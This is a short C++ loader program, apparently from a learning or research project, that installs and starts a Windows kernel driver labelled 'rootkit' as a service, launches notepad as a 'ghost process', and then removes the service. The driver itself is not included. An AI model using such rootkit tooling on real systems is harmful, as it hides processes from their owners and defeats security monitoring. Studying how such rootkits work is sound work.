#include "pch.h"
#include "ServiceManager.h"

constexpr const WCHAR* driverName = L"SubZero";
constexpr const WCHAR* driverPath = L"C:\\Users\\Daniel\\Desktop\\Drivers\\SubZero\\Debug\\SubZeroDriver.sys";

//int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
int main() {
	
	bool isInstalled = false;
	bool isStarted = false;

	// Load rootkit
	ServiceManager scm(driverName, driverPath, SERVICE_KERNEL_DRIVER);
	do {
		isInstalled = scm.Install();
		if (!isInstalled)
			break;

		std::wcout << "[+] Service installed" << std::endl;

		isStarted = scm.Start();
		if (!isStarted)
			break;

		std::wcout << "[+] Service started" << std::endl;

	} while (false);


    // Start ghost process
    PROCESS_INFORMATION  processInformation = { 0 };
    STARTUPINFO startupInfo = { 0 };
    startupInfo.cb = sizeof(startupInfo);
    //startupInfo.dwFlags = STARTF_USESHOWWINDOW;
    //startupInfo.wShowWindow = SW_HIDE;
    
	WCHAR cmdArgs[] = L"notepad";

    ::CreateProcessW(NULL, cmdArgs, NULL, NULL, FALSE, NULL, NULL, NULL, &startupInfo, &processInformation);

	if (isStarted) {
		scm.Stop();
		std::wcout << "[+] Service stopped" << std::endl;
	}

	if (isInstalled) {
		scm.Remove();
		std::wcout << "[+] Service removed" << std::endl;
	}

	return 0;
}